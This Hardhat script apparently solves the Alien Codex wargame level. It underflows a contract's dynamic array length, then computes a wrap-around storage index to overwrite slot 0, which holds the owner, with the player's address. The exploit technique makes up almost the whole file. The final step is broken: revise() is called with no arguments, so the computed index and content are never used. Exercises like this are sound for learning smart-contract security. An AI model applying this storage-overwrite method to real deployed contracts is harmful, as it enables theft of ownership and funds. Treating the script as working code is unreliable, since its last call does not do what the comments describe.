import { AbiCoder } from "@ethersproject/abi";
import { Wallet } from "ethers";
import { ethers } from "hardhat";

const attackAlienCodex = async () => {
    // change contract addresses here. change gas only if needed.
    const alienCodexAddress = "0xF675Be946818f77Ba00aD069C99C97080800656E";
    const playerAddress = "0x3C4f1C7Ab126a94016CA8F4e770522810aa61954";

    // knowledge in opcode required to finish this level. To understand how to get bytecodes above, please
    // read on:
    // https://medium.com/@blockchain101/solidity-bytecode-and-opcode-basics-672e9b1a88c2
    // https://blog.openzeppelin.com/deconstructing-a-solidity-contract-part-i-introduction-832efd2d7737/
    // https://ethereum.org/en/developers/docs/evm/opcodes

    /* don't change anything below */
    /*alternative ways to connect to provider and signer below*/
    /*const GOERLI_RPC_URL = "";    //place alchemy or infura link here
    *const GOERLI_RPC_URL = process.env.GOERLI_RPC_URL;
    *const provider = new ethers.providers.JsonRpcProvider(GOERLI_RPC_URL);
    *const signer = await provider.getSigner(); 
    *const tx1 = await signer.sendTransaction({
        from: playerAddress,
        data: bytecode,
    });
    */
    // const provider = await ethers.getDefaultProvider("goerli");
    // const PRIVATE_KEY =
    //     process.env.PRIVATE_KEY || ""; /*Private Keys in .env file or hardcode here*/
    // const wallet = new Wallet(PRIVATE_KEY, provider);

    // const tx1 = await wallet.sendTransaction({
    //     from: playerAddress,
    //     data: bytecode,
    // });
    // const txReceipt1 = await tx1.wait(1);
    // console.log(txReceipt1);
    // const _solver = await txReceipt1.contractAddress;
    const ABI = [
        "function make_contact()",
        "function retract()",
        "function revise(uint i, bytes32 _content) contacted public",
    ];
    const contract = await ethers.getContractAt(ABI, alienCodexAddress);
    const tx1 = await contract.make_contact();
    const tx1Receipt = await tx1.wait(1);
    console.log(tx1Receipt);
    const tx2 = await contract.retract();
    const tx2Receipt = await tx2.wait(1);
    console.log(tx2Receipt);
    // note here
    const abi = ethers.utils.defaultAbiCoder;
    const params = abi.encode(["uint256"], [1]);
    const position = await ethers.utils.keccak256(params);
    // notes here
    const i = BigInt(2 ** 256) - BigInt(position);
    const _content = "0x" + "0".repeat(24) + playerAddress.slice(2);
    const tx3 = await contract.revise();
    const tx3Receipt = await tx3.wait(1);
    // const txReceipt = await tx2.wait(1);
    // console.log(txReceipt);
};

attackAlienCodex()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error);
        process.exit(1);
    });
